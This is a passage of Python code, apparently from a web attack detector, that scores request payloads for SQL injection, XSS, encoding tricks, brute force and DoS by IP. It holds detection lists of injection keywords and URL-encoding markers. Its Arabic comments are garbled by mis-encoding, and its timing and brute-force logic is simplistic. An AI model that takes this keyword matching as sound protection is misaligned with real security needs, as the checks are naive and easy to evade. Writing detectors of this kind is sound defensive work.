        encoding_indicators = ['%25', '%2e', '%2f', '%5c', 'base64', 'utf-8']
        if sum(1 for ind in encoding_indicators if ind.lower() in payload.lower()) > 2:
            anomaly_score += 25
            print(f"âš ï¸  Ù…Ø­Ø§ÙˆÙ„Ø© Ø¥Ø®ÙØ§Ø¡ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… ØªØ´ÙÙŠØ±Ù…ØªØ¹Ø¯Ø¯")
        
        # 4. ÙƒÙ„Ù…Ø§Øª Ù…ÙØªØ§Ø­ÙŠØ© Ø®Ø·ÙŠØ±Ø© Ù…ØªØ¹Ø¯Ø¯Ø©
        dangerous_keywords = ['union', 'select', 'drop', 'delete', 'update', 
                             'insert', 'exec', 'script', 'eval', 'alert']
        keyword_count = sum(1 for kw in dangerous_keywords if kw in payload.lower())
        if keyword_count >= 3:
            anomaly_score += keyword_count * 10
            print(f"âš ï¸  ÙƒÙ„Ù…Ø§Øª Ù…ÙØªØ§Ø­ÙŠØ© Ø®Ø·ÙŠØ±Ø©: {keyword_count}")
        
        return anomaly_score
    
    def _check_brute_force(self, ip: str) -> bool:
        """ğŸ”¨ ÙØ­Øµ Ù‡Ø¬Ù…Ø§Øª Brute Force"""
        attacks = self.ip_reputation[ip]['attacks']
        
        # Ø£ÙƒØ«Ø± Ù…Ù† 5 Ù…Ø­Ø§ÙˆÙ„Ø§Øª ÙØ§Ø´Ù„Ø© ÙÙŠ Ø¢Ø®Ø± 5 Ø¯Ù‚Ø§Ø¦Ù‚
        recent_attacks = [a for a in attacks if a in ['SQL_INJECTION', 'XSS', 'COMMAND_INJECTION']]
        
        time_diff = (datetime.now() - self.ip_reputation[ip]['first_seen']).seconds
        
        if time_diff < 300 and len(recent_attacks) > 5:  # 5 Ø¯Ù‚Ø§Ø¦Ù‚
            return True
        
        return False
    
    def _check_dos_pattern(self, ip: str) -> bool:
        """ğŸ’¥ ÙØ­Øµ Ø£Ù†Ù…Ø§Ø· DOS"""
        # Ø­Ø³Ø§Ø¨ Ù…Ø¹Ø¯Ù„ Ø§Ù„Ø·Ù„Ø¨Ø§Øª
        time_diff = (datetime.now() - self.ip_reputation[ip]['first_seen']).seconds
        
        if time_diff == 0:
            return False
        
        attack_rate = len(self.ip_reputation[ip]['attacks']) / max(time_diff, 1)
        
        # Ø£ÙƒØ«Ø± Ù…Ù† 10 Ø·Ù„Ø¨Ø§Øª ÙÙŠ Ø§Ù„Ø«Ø§Ù†ÙŠØ©
        return attack_rate > 10
    
    def _is_suspicious_user_agent
